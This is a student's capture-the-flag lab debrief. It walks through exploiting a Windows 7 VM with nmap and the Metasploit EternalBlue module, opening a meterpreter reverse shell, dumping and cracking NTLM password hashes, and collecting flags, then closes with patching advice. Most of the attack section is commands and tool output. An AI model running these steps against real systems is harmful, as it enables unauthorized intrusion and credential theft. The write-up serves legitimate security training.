# Debriefing of Attack

## 1. Introduction

Here is the debriefing of the attack that was performed on a VM during Exam# 01 of **Bytewise
Cybersecurity Fellowship**.

- **Target System:**

  - Our target was a VM running Windows 7.
   
  - The network type was configured as Bridge (automatic) so that it could be located inside our LAN.

  - Our target machine is protected with a password for access.

- **Objective:**

 The target of this lab was to **gain remote access** to Windows 7 and then **extract 3 flags** from it which
are randomly located inside the directory of the machine.

## 2. Reconnaissance Phase

 The reconnaissance step was in which we had to perform the following two steps.

- **Information Gathering:**

This step involves gathering basic information about our target. One is the Port scanning but before
that let’s check the IP address of the target machine:

`sudo netdiscover -i eth0`

> sudo - To run the command as the root user

> netdiscover - A network tool found in Linux that can be used to identify devices on a local network.

> -i - This option will generate an ARP request to identify hosts inside the LAN.

> eth0 - This is the ethernet card from which the machine accesses the LAN.


```
92.168.43.163  00:0c:29:53:39:0e      1      60  VMware, Inc.
```

This command has returned all the IP addresses of devices connected with eth0, including our target
machine - VMware. This happens because we had configured the VM with Bridge mode of Network
type.

- **Vulnerability Assessment:**

Now in this step, we’ll perform a vulnerability assessment which is in short identifying vulnerabilities
through scanning for open ports. This can be performed by Nmap:

`sudo nmap -sS -sV 192.168.43.163`

> sS - This is a common and relatively stealthy way to scan for open ports on a target device.

> -sV - tells Nmap to perform version detection along with the scan.

```
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

For this lab, we’ll focus specifically on port# 445 - *microsoft-ds*.


> Port 445, also known by the name microsoft-ds, is associated with a communication protocol called
Server Message Block (SMB). This protocol is used for file sharing and other network communication
tasks in Windows systems.

## 3. Initial Access

Searching over the Internet reveals that port 445 SMB can be exploitable from **Eternal-blue** named
vulnerability, so we’ll be using Metasploit to exploit this vulnerability.

`sudo msfconsole`

`search eternal blue`

```
0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

`use 0` to use the first module.

`show options` - to adjust settings/options.

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
                                             Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.132   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

We only need to set the Remote host IP address, so:

`set RHOSTS 192.168.43.163`

Now it’s all ready to run this module.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.43.132:4444 
[*] 192.168.43.163:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.43.163:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.43.163:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.43.163:445 - The target is vulnerable.
[*] 192.168.43.163:445 - Connecting to target for exploitation.
[+] 192.168.43.163:445 - Connection established for exploitation.
[+] 192.168.43.163:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.43.163:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.43.163:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 192.168.43.163:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 192.168.43.163:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 192.168.43.163:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.43.163:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.43.163:445 - Sending all but last fragment of exploit packet
[*] 192.168.43.163:445 - Starting non-paged pool grooming
[+] 192.168.43.163:445 - Sending SMBv2 buffers
[+] 192.168.43.163:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.43.163:445 - Sending final SMBv2 buffers.
[*] 192.168.43.163:445 - Sending last fragment of exploit packet!
[*] 192.168.43.163:445 - Receiving response from exploit packet
[+] 192.168.43.163:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.43.163:445 - Sending egg to corrupted connection.
[*] 192.168.43.163:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 192.168.43.163
[*] Meterpreter session 1 opened (192.168.43.132:4444 -> 192.168.43.163:49158) at 2024-07-10 13:08:34 -0400
[+] 192.168.43.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

It opens the meterpreter.

## 4. Post-Exploitation Phase

Once we gain system privileges, we can access the login password hashes from the compromised
system by using the **hashdump** command:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

We have got the password but in hashed form. So now let’s use *crackthehash.net*.

>Type: NTLM

> Result: alqfna22

Now let’s migrate from meterpreter to shell. Just type **shell** and it will turn into cmd of the target
machine.

```
meterpreter > shell
Process 348 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

From here we can access all the files/folders of the machine.

## 5. Data Extraction or Manipulation:

Now here, we will find and capture all three flags stored randomly inside the machine

Searching all around, finally found all three flags:

### Flag 1

> C:\

`flag{access_the_machine}`

### Flag 2

> C:\Windows\System32\config

`flag{sam_database_elevated_access}`

### Flag 3

> c:\Users\Jon\Documents

`flag(admin_documents_can_be_valuable)`


## 7. Conclusion:

In conclusion, we looked for open port vulnerabilities in the machine. Exploit port 445 with
eternal-blue exploit. Gained the meterpreter access. Gained passwords hash and cracked them. And
lastly, capture all three flags.

Overall, attack targets were successfully achieved, but this simple lab was much more challenging. In
this lab, many steps like deleting logs were missing, and in the future, I try to cover those steps.

- Exploit port 445. 

- Gain the meterpreter shell

- Dump content of SAM DB

- Crack the John's hash

- Get the Server Login

## 8. Recommendations:

Firstly, the attack worked on Windows 7 which is too old a machine and easy to compromise. Avoid
using old systems or upgrade them.

Secondly, the exploit occurs through the Smb port, so security patches must be designed to avoid this
vulnerability.

Thirdly. passwords were too easy to crack, so employees should be educated to use strong passwords
to avoid crack.
